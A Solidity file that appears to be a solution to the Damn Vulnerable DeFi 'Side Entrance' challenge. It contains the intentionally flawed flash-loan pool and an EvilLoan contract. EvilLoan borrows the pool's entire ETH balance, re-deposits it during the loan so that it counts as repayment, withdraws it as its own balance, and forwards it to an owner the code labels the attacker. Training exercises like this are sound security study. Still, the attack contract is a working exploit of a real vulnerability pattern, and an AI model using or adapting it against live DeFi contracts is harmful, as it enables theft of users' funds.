// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value; // increase msg.sender balance by msg.value
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender]; // check balance of msg.sender
        balances[msg.sender] = 0; //update msg.sender balance
        payable(msg.sender).sendValue(amountToWithdraw); // send eth to msg.sender
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance; // check alance of pool
        require(balanceBefore >= amount, "Not enough ETH in balance"); // check against borrow amount

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); // the contract that ask for the loan must have a receiver function.

        require(
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        ); // required that the balance borrowed is repayed.
    }
}

contract EvilLoan {
    using Address for address payable;
    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    function execute() external payable {
        // deposit everything received back into the pool.
        pool.deposit{value: msg.value}();
    }

    function loan() external {
        pool.flashLoan(address(pool).balance); // initiate loan
        pool.withdraw(); // withdraw from pool
        payable(owner).sendValue(address(this).balance); // send to attacker
    }

    receive() external payable {} // a contract needs this to receive ETH (or fallback)
}
